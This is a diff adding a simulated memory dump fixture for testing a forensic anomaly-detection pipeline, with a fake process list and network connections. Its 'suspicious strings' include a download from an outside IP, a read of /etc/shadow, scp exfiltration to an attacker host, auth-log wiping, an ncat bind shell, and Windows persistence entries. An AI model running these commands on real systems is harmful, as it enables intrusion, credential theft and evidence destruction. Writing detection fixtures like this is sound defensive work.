@@ -1,0 +1,38 @@
+PAGEDUMP
+--- Simulated Memory Dump for Testing ---
+This is a simulated memory dump file for testing the forensic analysis pipeline.
+It contains patterns that should trigger anomaly detection.
+
+Process List (simulated):
+PID    PPID   Name                    User          Memory
+1      0      systemd                 root          8.2MB
+245    1      sshd                    root          4.1MB
+890    245    sshd: root@pts/0        root          5.3MB
+891    890    bash                    root          3.2MB
+1234   891    wget                    root          2.1MB
+1235   891    .cache_update           root          832.5MB
+2001   1      apache2                 www-data      12.4MB
+2101   2001   apache2                 www-data      15.6MB
+3001   1      cron                    root          1.8MB
+3500   1      ncat                    root          3.4MB
+
+Network Connections (simulated):
+PROTO  LOCAL            REMOTE             STATE        PID
+tcp    10.0.1.10:22     192.168.1.105:55434 ESTABLISHED  890
+tcp    10.0.1.10:80     10.0.1.50:44321    ESTABLISHED  2101
+tcp    10.0.1.10:44500  194.26.29.110:80   CLOSE_WAIT   1234
+tcp    10.0.1.10:49001  194.26.29.110:4444 ESTABLISHED  1235
+tcp    0.0.0.0:4444     0.0.0.0:0          LISTEN       3500
+
+Suspicious Strings Found in Memory:
+/tmp/.cache_update --beacon
+wget http://194.26.29.110/x86_64
+cat /etc/shadow
+scp /tmp/.backup.tar.gz attacker@194.26.29.110:/data/exfil/
+echo "" > /var/log/auth.log
+ncat -lvp 4444 -e /bin/bash
+iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
+
+Registry-like Artifacts (if Windows):
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = C:\Users\Public\svchost.exe
+HKLM\SYSTEM\CurrentControlSet\Services\backdoor_svc\ImagePath = C:\Users\Public\svchost.exe
